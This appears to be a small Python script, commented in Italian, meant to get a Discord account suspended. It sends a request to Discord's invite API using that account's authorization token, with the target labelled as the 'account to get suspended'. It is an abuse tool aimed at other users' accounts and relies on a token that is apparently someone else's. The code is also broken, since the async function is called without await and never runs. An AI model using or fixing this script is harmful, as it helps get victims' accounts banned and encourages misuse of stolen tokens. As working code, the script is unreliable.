python
import requests
from colorama import Fore

request = requests.Session() # Richieste
token = "" # Account da far sospendere
inv = "discord-testers" # Discord casuale


async def ban_account(): # API Triggering
    r = requests.post(f'https://discord.com/api/v9/invites/{inv}', headers={'Authorization': token})
    print(f'{Fore.GREEN}code: {r.status_code}')


if __name__ == '__main__':
    ban_account()
